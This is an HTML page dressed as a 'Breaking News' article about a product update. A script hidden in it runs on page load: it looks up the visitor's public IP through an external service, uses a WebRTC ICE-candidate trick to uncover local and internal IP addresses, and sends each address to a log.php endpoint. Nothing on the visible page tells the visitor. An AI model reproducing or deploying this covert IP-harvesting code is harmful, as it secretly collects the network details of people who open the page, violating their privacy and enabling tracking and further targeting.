<!DOCTYPE html>
<html>
<head>
<title>Latest News</title>
<style>
    body { font-family: Arial, sans-serif; background: #f4f4f4; color: #333; }
    .container { max-width: 800px; margin: 50px auto; padding: 20px; background: white; border-radius: 6px; }
    h1 { color: #0077cc; }
</style>
</head>
<body>
<div class="container">
    <h1>Breaking News: Major Update Released</h1>
    <p>Our team has just rolled out the latest update with exciting new features and security improvements. Stay tuned for more details as they come in.</p>
    <p>Read the full article below...</p>
</div>

<script>
// Function to send found IPs to your server
function logToServer(ip) {
    fetch("log.php?ip=" + encodeURIComponent(ip))
        .catch(err => console.error(err));
}

// Grab the public IP from an external service
fetch("https://api.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
        logToServer("Public IP: " + data.ip);
    });

// WebRTC to try to get local/internal IPs
async function getLocalIPs(callback) {
    const pc = new RTCPeerConnection({iceServers: []});
    pc.createDataChannel('');
    pc.onicecandidate = (event) => {
        if (!event.candidate) return;
        const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
        const ipMatch = regex.exec(event.candidate.candidate);
        if (ipMatch) {
            callback(ipMatch[1]);
        }
    };
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
}

getLocalIPs(ip => {
    logToServer("Local IP: " + ip);
});
</script>
</body>
</html>
